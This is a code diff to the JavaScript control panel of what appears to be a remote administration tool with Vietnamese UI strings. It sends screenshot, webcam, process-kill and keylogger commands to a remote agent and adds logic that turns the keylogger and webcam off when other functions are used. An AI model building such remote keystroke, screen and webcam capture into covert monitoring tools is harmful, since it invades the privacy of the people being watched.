@@ -71,9 +71,14 @@ function killProcess(target, type = 'PID', isApplication = false) {
 
 // Nút 3: Screenshot
 function requestScreenshot() {
-    switchView('view-media', 'Ảnh chụp màn hình');
+    // Clear old screenshot image and set waiting flag - DON'T switch view yet
+    const screenshotImg = document.getElementById('monitor-img');
+    if (screenshotImg) {
+        screenshotImg.src = ''; // Clear old screenshot image
+    }
+    isWaitingForScreenshot = true;
     sendToGateway({ command: 'TAKEPIC' });
-    logStatus("Đang yêu cầu chụp màn hình...");
+    logStatus("Đang yêu cầu chụp màn hình... Đợi nhận ảnh...");
 }
 
 // Nút 4: Webcam Toggle
@@ -144,10 +149,15 @@ function turnOffWebcamIfOn() {
 }
 
 /**
- * Initializes event delegation to automatically turn off webcam when other buttons are clicked
- * This intercepts button clicks and turns off webcam before the original handler runs
- * The webcam button itself is excluded from this behavior
- * Handles both sidebar buttons and dynamically created buttons (e.g., kill buttons in table)
+ * Initializes event delegation to automatically turn off webcam / keylogger
+ * when other buttons are clicked.
+ *
+ * This intercepts button clicks and turns off webcam/keylogger before the
+ * original handler runs.
+ *
+ * The webcam & keylogger buttons themselves are excluded from this behavior.
+ * Handles both sidebar buttons and dynamically created buttons (e.g., kill
+ * buttons in table).
  */
 function initWebcamAutoOff() {
     const container = document.querySelector('.container');
@@ -160,14 +170,23 @@ function initWebcamAutoOff() {
         const button = event.target.closest('button');
         if (!button) return;
         
-        // Exclude the webcam button itself
-        if (button.id === 'btn-webcam') return;
+        // Exclude the webcam and keylogger buttons themselves
+        if (
+            button.id === 'btn-webcam' ||
+            button.id === 'btn-keylog-start' ||
+            button.id === 'btn-keylog-stop' ||
+            button.id === 'btn-keylog-clear' ||
+            button.id === 'btn-keylog-print'
+        ) {
+            return;
+        }
         
-        // Turn off webcam if it's on (before the original onclick handler executes)
+        // Turn off webcam / keylogger if they're on (before the original onclick handler executes)
         turnOffWebcamIfOn();
+        turnOffKeylogIfOn();
         
         // Note: The original onclick handler will still execute normally
-        // This just ensures webcam is turned off first
+        // This just ensures webcam/keylogger are turned off first
     });
 }
 
@@ -242,8 +261,35 @@ function updateKeylogButtons() {
         if (btnStart) btnStart.style.display = 'block';
         if (btnStop) btnStop.style.display = 'none';
         if (btnPrint) btnPrint.style.display = 'none';
-        if (btnClear) btnClear.style.display = 'block'; // Keep clear visible
+        if (btnClear) btnClear.style.display = 'none'; // Hide clear button when keylogger is off
     }
+}
+
+// --- KEYLOGGER STATE MANAGER ---
+// Centralized keylogger control - automatically turns off keylogger when other buttons are pressed
+// This keeps command handlers focused only on sending commands, not on global coordination.
+
+/**
+ * Turns off keylogger if it's currently on.
+ * Sends the unhook command, updates UI state, and stops the auto-refresh timer.
+ */
+function turnOffKeylogIfOn() {
+    if (!isKeyloggerActive) return;
+
+    // Send unhook command to agent
+    sendToGateway({ command: 'KEYLOG_UNHOOK' });
+
+    // Update local state & UI
+    isKeyloggerActive = false;
+    updateKeylogButtons();
+
+    // Stop auto-refresh if running
+    if (keylogAutoRefreshTimer) {
+        clearInterval(keylogAutoRefreshTimer);
+        keylogAutoRefreshTimer = null;
+    }
+
+    logStatus("Đang tắt keylogger (tự động do chuyển chức năng)...");
 }
 
 // --- SYSTEM COMMANDS ---
